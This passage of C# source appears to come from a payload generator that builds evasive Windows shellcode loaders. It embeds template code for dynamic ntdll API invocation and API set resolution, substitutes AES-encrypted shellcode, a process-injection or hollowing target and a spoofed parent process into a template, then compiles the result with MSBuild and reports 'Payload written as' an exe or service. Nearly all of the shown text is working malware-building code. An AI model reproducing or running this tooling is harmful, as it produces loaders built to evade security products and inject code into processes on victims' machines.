                string ApiSetEntryName = Marshal.PtrToStringUni((IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetEntry.NameOffset), SetEntry.NameLength / 2);
                string ApiSetEntryKey = ApiSetEntryName.Substring(0, ApiSetEntryName.Length - 2) + "".dll""; // Remove the patch number and add .dll

                STRUCTS.ApiSetValueEntry SetValue = new STRUCTS.ApiSetValueEntry();
                IntPtr pSetValue = IntPtr.Zero;

                if (SetEntry.ValueLength == 1)
                    pSetValue = (IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetEntry.ValueOffset);
                else if (SetEntry.ValueLength > 1)
                {
                    // Loop through the hosts until we find one that is different from the key, if available
                    for (var j = 0; j < SetEntry.ValueLength; j++)
                    {
                        IntPtr host = (IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetEntry.ValueOffset + (UInt64)Marshal.SizeOf(SetValue) * (UInt64)j);
                        if (Marshal.PtrToStringUni(host) != ApiSetEntryName)
                            pSetValue = (IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetEntry.ValueOffset + (UInt64)Marshal.SizeOf(SetValue) * (UInt64)j);
                    }
                    // If there is not one different from the key, then just use the key and hope that works
                    if (pSetValue == IntPtr.Zero)
                        pSetValue = (IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetEntry.ValueOffset);
                }

                SetValue = (STRUCTS.ApiSetValueEntry)Marshal.PtrToStructure(pSetValue, typeof(STRUCTS.ApiSetValueEntry));
                string ApiSetValue = string.Empty;
                if (ApiSetEntryName.Contains(""processthreads""))
                {
                    IntPtr pValue = (IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetValue.ValueOffset);
                }
                if (SetValue.ValueCount != 0)
                {
                    IntPtr pValue = (IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetValue.ValueOffset);
                    ApiSetValue = Marshal.PtrToStringUni(pValue, SetValue.ValueCount / 2);
                }
                ApiSetDict.Add(ApiSetEntryKey, ApiSetValue);
            }
            // Return dict
            return ApiSetDict;
        }
        public static STRUCTS.NTSTATUS NtQueryInformationProcess(IntPtr hProcess, STRUCTS.PROCESSINFOCLASS processInfoClass, out IntPtr pProcInfo)
        {
            int processInformationLength;
            UInt32 RetLen = 0;

            switch (processInfoClass)
            {
                case STRUCTS.PROCESSINFOCLASS.ProcessWow64Information:
                    pProcInfo = Marshal.AllocHGlobal(IntPtr.Size);
                    RtlZeroMemory(pProcInfo, IntPtr.Size);
                    processInformationLength = IntPtr.Size;
                    break;
                case STRUCTS.PROCESSINFOCLASS.ProcessBasicInformation:
                    STRUCTS.PROCESS_BASIC_INFORMATION PBI = new STRUCTS.PROCESS_BASIC_INFORMATION();
                    pProcInfo = Marshal.AllocHGlobal(Marshal.SizeOf(PBI));
                    RtlZeroMemory(pProcInfo, Marshal.SizeOf(PBI));
                    Marshal.StructureToPtr(PBI, pProcInfo, true);
                    processInformationLength = Marshal.SizeOf(PBI);
                    break;
                default:
                    throw new InvalidOperationException($""Invalid ProcessInfoClass: {processInfoClass}"");
            }
            object[] funcargs =
            {
                hProcess, processInfoClass, pProcInfo, processInformationLength, RetLen
            };

            STRUCTS.NTSTATUS retValue = (STRUCTS.NTSTATUS)DynamicAPIInvoke(@""ntdll.dll"", @""NtQueryInformationProcess"", typeof(DELEGATES.NtQueryInformationProcess), ref funcargs);
            if (retValue != STRUCTS.NTSTATUS.Success)
            {
                throw new UnauthorizedAccessException(""Access is denied."");
            }

            // Update the modified variables
            pProcInfo = (IntPtr)funcargs[2];
            return retValue;
        }
        public static void RtlZeroMemory(IntPtr Destination, int Length)
        {
            // Craft an array for the arguments
            object[] funcargs =
            {
                Destination, Length
            };

            DynamicAPIInvoke(@""ntdll.dll"", @""RtlZeroMemory"", typeof(DELEGATES.RtlZeroMemory), ref funcargs);
        }
    }";
            }
            else
            {
                Console.WriteLine("Invalid technique!");
                System.Environment.Exit(0);
            }

            Decryptfunc = @"
        static string DecryptStringFromBytes_Aes(byte[] cipherText, byte[] Key, byte[] IV)
        {
            if (cipherText == null || cipherText.Length <= 0)
                throw new ArgumentNullException(""cipherText"");
            if (Key == null || Key.Length <= 0)
                    throw new ArgumentNullException(""Key"");
                if (IV == null || IV.Length <= 0)
                    throw new ArgumentNullException(""IV"");
                string plaintext = null;
                using (Aes aesAlg = Aes.Create())
                {
                    aesAlg.Key = Key;
                    aesAlg.IV = IV;
                    ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                    using (MemoryStream msDecrypt = new MemoryStream(cipherText))
                    {
                        using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                        {
                            using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                            {
                                plaintext = srDecrypt.ReadToEnd();
                            }
                        }
                    }
                }
                return plaintext;
        }
            ";

            string text = File.ReadAllText(template);
            text = text.Replace("<IMPORTS>", Imports);
            text = text.Replace("<MAIN>", Mainfunc);
            text = text.Replace("<DECRYPTFUNC>", Decryptfunc);
            text = text.Replace("<CLASSES>", Classes);
            File.WriteAllText(outputfile, text); //Write out to Program.cs which is called in .csproj
            text = File.ReadAllText(outputfile);
            text = text.Replace("<KEY>", MyKey);
            text = text.Replace("<IV>", Myiv);
            text = text.Replace("<SHELLCODE>", formattedencryptedshellcode);
            text = text.Replace("<PROCESS>", inject_hollow_target);
            text = text.Replace("<PARENT>", parent_process);
            File.WriteAllText(outputfile, text); //Write out to Program.cs which is called in .csproj

            string buildcommand = " /C \"c:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\MSBuild\\Current\\Bin\\amd64\\MSBuild.exe\" " + buildfile + " /p:Configuration=Release /p:Platform=" + architecture + " /t:Clean,Build /p:OutputPath=" + cd;
            //Console.WriteLine(buildcommand);
            System.Diagnostics.Process.Start("CMD.exe", buildcommand);
            Sleep(3000);
            if (format == "service")
            {
                File.Delete(cd + "\\" + format + technique + ".exe");
                File.Move(cd + "\\" + outputproduct, cd + "\\" + format + technique + ".exe");
                Console.WriteLine("Payload written as :" + cd + "\\" + format + technique + ".exe");
            }
            else
            {
                File.Delete(cd + "\\" + technique + "." + format);
                File.Move(cd + "\\" + outputproduct, cd + "\\" + technique + "." + format);
                Console.WriteLine("Payload written as :" + cd + "\\" + technique + "." + format);
            }
        }
        static byte[] EncryptStringToBytes_Aes(string plainText, byte[] Key, byte[] IV)
        {
            // Check arguments.
            if (plainText == null || plainText.Length <= 0)
                throw new ArgumentNullException("plainText");
            if (Key == null || Key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (IV == null || IV.Length <= 0)
                throw new ArgumentNullException("IV");
            byte[] encrypted;

            // Create an Aes object
            // with the specified key and IV.
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = Key;
                aesAlg.IV = IV;

                // Create an encryptor to perform the stream transform.
                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

                // Create the streams used for encryption.
                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                        {
                            //Write all data to the stream.
                            swEncrypt.Write(plainText);
                        }
                        encrypted = msEncrypt.ToArray();
                    }
                }
            }
            // Return the encrypted bytes from the memory stream.
            return encrypted;
        }
    }
}